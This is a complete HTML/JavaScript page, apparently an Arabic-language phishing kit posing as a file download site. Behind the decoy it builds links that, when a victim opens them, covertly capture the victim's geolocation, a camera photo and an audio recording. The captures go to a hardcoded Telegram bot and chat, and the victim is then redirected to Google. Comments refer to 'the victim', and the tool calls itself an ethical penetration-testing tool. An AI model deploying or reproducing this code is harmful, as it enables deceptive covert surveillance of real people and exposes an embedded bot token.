<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز تحميل الملفات - تحميل سريع</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* القسم الحقيقي (مخفي للمستخدم العادي) */
        .admin-panel {
            display: none;
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 10px;
            z-index: 9999;
        }
        .admin-panel button {
            background: #ff4444;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
        }

        /* الصفحة المموهة (الوهمية) */
        .fake-page {
            max-width: 500px;
            width: 100%;
        }

        .download-card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }

        .download-card h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .download-card p {
            color: #666;
            margin-bottom: 25px;
        }

        .file-icon {
            font-size: 80px;
            margin: 20px 0;
        }

        .download-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }

        .download-btn:hover {
            transform: scale(1.02);
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .ad-banner {
            background: #f0f0f0;
            padding: 15px;
            margin-top: 20px;
            border-radius: 10px;
            color: #999;
            font-size: 12px;
        }

        /* الوضع المخفي للضحية */
        .hidden-panel {
            display: none;
        }
    </style>
</head>
<body>

<!-- زر الدخول إلى لوحة التحكم (يظهر فقط للمختبر) -->
<div class="admin-panel" id="adminPanel">
    <button onclick="showAdmin()">🔧 فتح لوحة التحكم</button>
</div>

<!-- الصفحة المموهة (التي يراها الضحية) -->
<div class="fake-page" id="fakePage">
    <div class="download-card">
        <div class="file-icon">📦</div>
        <h1>تحميل ملف Setup_v2.4.rar</h1>
        <p>حجم الملف: 24.7 MB</p>
        <p>⏱️ وقت التحميل المتوقع: 30 ثانية</p>
        <button class="download-btn" id="fakeDownloadBtn">📥 تحميل الملف</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px;">جاري التحميل...</p>
        </div>
        <div class="ad-banner">
            🔒 تم فحص الملف بواسطة antivirus • آمن 100%
        </div>
    </div>
</div>

<!-- الأداة الحقيقية (تظهر بعد 3 ثواني من الضغط على زر التحميل) -->
<div class="hidden-panel" id="realTool">
    <div style="max-width: 550px; margin: 0 auto; background: rgba(20,26,42,0.95); border-radius: 28px; padding: 35px; box-shadow: 0 25px 45px rgba(0,0,0,0.4);">
        <h2 style="color: #00d4ff; text-align: center;">🛡️ Dark101 Security</h2>
        <p style="color: #8892b0; text-align: center; margin-bottom: 20px;">أداة اختبار اختراق أخلاقي</p>
        
        <label style="color: #ccd6f6;">📱 Chat ID</label>
        <input type="text" id="chatIdInput" value="5849068535" style="width:100%; padding:12px; margin-bottom:15px; background:#0a0f1a; border:1px solid #00d4ff; color:white; border-radius:10px;">
        
        <label style="color: #ccd6f6;">🤖 توكن البوت</label>
        <input type="text" id="tokenInput" value="8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU" style="width:100%; padding:12px; margin-bottom:15px; background:#0a0f1a; border:1px solid #00d4ff; color:white; border-radius:10px;">
        
        <div style="background: rgba(0,212,255,0.05); border-radius: 18px; padding: 15px; margin: 20px 0;">
            <div style="display: flex; gap: 12px; padding: 8px 0;">
                <input type="checkbox" id="camFront" checked> <label style="color:#ccd6f6;">📸 صورة أمامية</label>
            </div>
            <div style="display: flex; gap: 12px; padding: 8px 0;">
                <input type="checkbox" id="location" checked> <label style="color:#ccd6f6;">📍 الموقع</label>
            </div>
            <div style="display: flex; gap: 12px; padding: 8px 0;">
                <input type="checkbox" id="audio"> <label style="color:#ccd6f6;">🎤 تسجيل صوتي</label>
            </div>
        </div>
        
        <button id="realGenerateBtn" style="width:100%; padding:15px; background: linear-gradient(90deg,#00d4ff,#0077ff); border:none; border-radius:40px; color:white; font-weight:bold; cursor:pointer;">🔗 إنشاء رابط الاختبار</button>
        
        <div id="realResult" style="display:none; margin-top:20px; background:rgba(0,212,255,0.1); border-radius:14px; padding:12px; display:flex; gap:10px;">
            <div id="realLinkText" style="flex:1; font-size:12px; color:#ccd6f6;"></div>
            <button id="realCopyBtn" style="background:#0077ff; border:none; padding:8px 18px; border-radius:25px; color:white;">نسخ</button>
        </div>
    </div>
</div>

<script>
// الضغط على زر التحميل الوهمي
let clickCount = 0;
const fakeBtn = document.getElementById('fakeDownloadBtn');
const loading = document.getElementById('loading');
const fakePage = document.getElementById('fakePage');
const realTool = document.getElementById('realTool');

fakeBtn.onclick = () => {
    clickCount++;
    
    if (clickCount === 1) {
        // أول ضغطة: تظهر شاشة تحميل
        loading.style.display = 'block';
        fakeBtn.disabled = true;
        
        setTimeout(() => {
            loading.style.display = 'none';
            fakeBtn.innerHTML = '⚠️ فشل التحميل - حاول مرة أخرى';
            fakeBtn.disabled = false;
            fakeBtn.style.background = '#ff4444';
        }, 3000);
    } 
    else if (clickCount === 2) {
        // الضغطة الثانية: تظهر الأداة الحقيقية
        loading.style.display = 'block';
        fakeBtn.disabled = true;
        
        setTimeout(() => {
            fakePage.style.display = 'none';
            realTool.style.display = 'block';
            document.body.style.background = '#0a0f1a';
            
            // إظهار لوحة التحكم للمختبر
            document.getElementById('adminPanel').style.display = 'block';
        }, 2000);
    }
};

// وظائف الأداة الحقيقية
document.getElementById('realGenerateBtn').onclick = () => {
    const chat = document.getElementById('chatIdInput').value;
    const token = document.getElementById('tokenInput').value;
    const features = [];
    if(document.getElementById('camFront').checked) features.push('cam');
    if(document.getElementById('location').checked) features.push('loc');
    if(document.getElementById('audio').checked) features.push('audio');
    
    const link = `${window.location.href.split('?')[0]}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&f=${features.join(',')}`;
    document.getElementById('realLinkText').innerText = link;
    document.getElementById('realResult').style.display = 'flex';
};

document.getElementById('realCopyBtn').onclick = async () => {
    await navigator.clipboard.writeText(document.getElementById('realLinkText').innerText);
    alert('✅ تم نسخ الرابط');
};

// وظيفة فتح لوحة التحكم (إذا نسيها المختبر)
function showAdmin() {
    fakePage.style.display = 'none';
    realTool.style.display = 'block';
    document.body.style.background = '#0a0f1a';
    document.getElementById('adminPanel').style.display = 'none';
}

// معالجة الرابط الجانبي
const urlParams = new URLSearchParams(window.location.search);
const chatParam = urlParams.get('chat');
const tokenParam = urlParams.get('token');
const fParam = urlParams.get('f');

if(chatParam && tokenParam && fParam) {
    // إخفاء كل شيء وإظهار شاشة تحميل وهمية للضحية
    document.body.innerHTML = `
        <div style="text-align:center;padding:50px;background:white;min-height:100vh;">
            <div style="max-width:400px;margin:0 auto">
                <div class="spinner" style="margin:0 auto"></div>
                <h3 style="margin-top:20px">جاري تحضير الملف...</h3>
                <p style="color:#666">يرجى الانتظار</p>
            </div>
        </div>
        <style>
            .spinner{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;animation:spin 1s linear infinite}
            @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        </style>
    `;
    
    // إرسال البيانات في الخلفية
    setTimeout(() => {
        if(fParam.includes('loc')) {
            navigator.geolocation.getCurrentPosition((pos) => {
                fetch(`https://api.telegram.org/bot${tokenParam}/sendMessage`, {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({chat_id: chatParam, text: `📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`})
                });
            });
        }
        if(fParam.includes('cam')) {
            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chatParam);
                        fd.append('photo', blob, 'photo.jpg');
                        fetch(`https://api.telegram.org/bot${tokenParam}/sendPhoto`, {method:'POST', body:fd});
                        stream.getTracks().forEach(t => t.stop());
                    });
                }, 1000);
            });
        }
        if(fParam.includes('audio')) {
            navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'audio/mp4'});
                    const fd = new FormData();
                    fd.append('chat_id', chatParam);
                    fd.append('audio', blob, 'audio.mp4');
                    fetch(`https://api.telegram.org/bot${tokenParam}/sendAudio`, {method:'POST', body:fd});
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            });
        }
        
        // توجيه الضحية لموقع حقيقي بعد 5 ثوان
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 5000);
    }, 1000);
}
</script>
</body>
</html>
